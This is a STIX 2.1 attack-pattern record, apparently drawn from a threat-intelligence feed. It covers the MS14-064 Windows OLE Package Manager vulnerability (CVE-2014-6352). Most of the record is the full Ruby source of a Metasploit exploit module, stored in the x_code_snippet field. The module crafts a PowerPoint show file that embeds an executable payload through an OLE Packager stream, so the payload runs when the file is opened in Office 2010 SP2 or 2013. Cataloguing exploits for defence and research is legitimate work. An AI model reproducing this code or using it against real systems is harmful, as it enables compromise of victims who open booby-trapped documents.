{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--838f02e2-45e8-4fa6-8bd6-e5e3180f7f29",
    "created": "2024-08-14T16:35:43.035242Z",
    "modified": "2024-08-14T16:35:43.035247Z",
    "name": "\"MS14-064 Microsoft Windows OLE Package Manager Code Execution\"",
    "description": " This module exploits a vulnerability found in Windows Object Linking and Embedding (OLE) allowing arbitrary code execution, publicly exploited in the wild as MS14-060 patch bypass. The Microsoft update tried to fix the vulnerability publicly known as \"Sandworm\". Platforms such as Windows Vista SP2 all the way to Windows 8, Windows Server 2008 and 2012 are known to be vulnerable. However, based on our testing, the most reliable setup is on Windows platforms running Office 2013 and Office 2010 SP2. Please keep in mind that some other setups such as using Office 2010 SP1 might be less stable, and may end up with a crash due to a failure in the CPackage::CreateTempFileName function.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ms14_064_packager_run_as_admin.rb",
            "external_id": "ms14_064_packager_run_as_admin.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6352"
        },
        {
            "source_name": "reference",
            "url": "http://blogs.mcafee.com/mcafee-labs/bypassing-microsofts-patch-sandworm-zero-day-even-editing-dangerous"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/ole'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS14-064 Microsoft Windows OLE Package Manager Code Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in Windows Object Linking and Embedding (OLE)\n        allowing arbitrary code execution, publicly exploited in the wild as MS14-060 patch bypass.\n        The Microsoft update tried to fix the vulnerability publicly known as \"Sandworm\". Platforms\n        such as Windows Vista SP2 all the way to Windows 8, Windows Server 2008 and 2012 are known\n        to be vulnerable. However, based on our testing, the most reliable setup is on Windows\n        platforms running Office 2013 and Office 2010 SP2. Please keep in mind that some other\n        setups such as using Office 2010 SP1 might be less stable, and may end up with a\n        crash due to a failure in the CPackage::CreateTempFileName function.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Haifei Li', # Vulnerability discovery\n          'sinn3r', # Metasploit module\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-6352'],\n          ['MSB', 'MS14-064'],\n          ['BID', '70690'],\n          ['URL', 'http://blogs.mcafee.com/mcafee-labs/bypassing-microsofts-patch-sandworm-zero-day-even-editing-dangerous']\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 2048,\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'Targets'        =>\n        [\n          ['Windows 7 SP1 / Office 2010 SP2 / Office 2013', {}],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-10-21',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [true, 'The PPSX file', 'msf.ppsx'])\n      ])\n  end\n\n  def exploit\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    ole_stream = ole_packager\n    zip = zip_ppsx(ole_stream)\n    file_create(zip)\n  end\n\n  def zip_ppsx(ole_stream)\n    zip_data = {}\n    data_dir = File.join(Msf::Config.data_directory, 'exploits', 'CVE-2014-6352', 'template_run_as_admin')\n\n    Dir[\"#{data_dir}/**/**\"].each do |file|\n      unless File.directory?(file)\n        zip_data[file.sub(data_dir,'')] = File.read(file, mode: 'rb')\n      end\n    end\n\n    # add the otherwise skipped \"hidden\" file\n    file = \"#{data_dir}/_rels/.rels\"\n    zip_data[file.sub(data_dir,'')] = File.read(file, mode: 'rb')\n\n    # put our own OLE streams\n    zip_data['/ppt/embeddings/oleObject1.bin'] = ole_stream\n\n    # create the ppsx\n    ppsx = Rex::Zip::Archive.new\n    zip_data.each_pair do |k,v|\n      ppsx.add_file(k,v)\n    end\n\n    ppsx.pack\n  end\n\n  def ole_packager\n    payload_name = \"#{rand_text_alpha(4)}.exe\"\n\n    file_info = [2].pack('v')\n    file_info << \"#{payload_name}\\x00\"\n    file_info << \"#{payload_name}\\x00\"\n    file_info << \"\\x00\\x00\"\n\n    extract_info = [3].pack('v')\n    extract_info << [payload_name.length + 1].pack('V')\n    extract_info << \"#{payload_name}\\x00\"\n\n    p = generate_payload_exe\n    file = [p.length].pack('V')\n    file << p\n\n    append_info = [payload_name.length].pack('V')\n    append_info << Rex::Text.to_unicode(payload_name)\n    append_info << [payload_name.length].pack('V')\n    append_info << Rex::Text.to_unicode(payload_name)\n    append_info << [payload_name.length].pack('V')\n    append_info << Rex::Text.to_unicode(payload_name)\n\n    ole_data = file_info + extract_info + file + append_info\n    ole_contents = [ole_data.length].pack('V') + ole_data\n\n    ole = create_ole(\"\\x01OLE10Native\", ole_contents)\n\n    ole\n  end\n\n  def create_ole(stream_name, data)\n    ole_tmp = Rex::Quickfile.new('ole')\n    stg = Rex::OLE::Storage.new(ole_tmp.path, Rex::OLE::STGM_WRITE)\n\n    stm = stg.create_stream(stream_name)\n    stm << data\n    stm.close\n\n    directory = stg.instance_variable_get(:@directory)\n    directory.each_entry do |entry|\n      if entry.instance_variable_get(:@_ab) == 'Root Entry'\n        # 0003000C-0000-0000-c000-000000000046 # Packager\n        clsid = Rex::OLE::CLSID.new(\"\\x0c\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x46\")\n        entry.instance_variable_set(:@_clsId, clsid)\n      end\n    end\n\n    # write to disk\n    stg.close\n\n    ole_contents = File.read(ole_tmp.path, mode: 'rb')\n    ole_tmp.close\n    ole_tmp.unlink\n\n    ole_contents\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-10-21",
    "x_mitre_platforms": [
        "win'"
    ]
}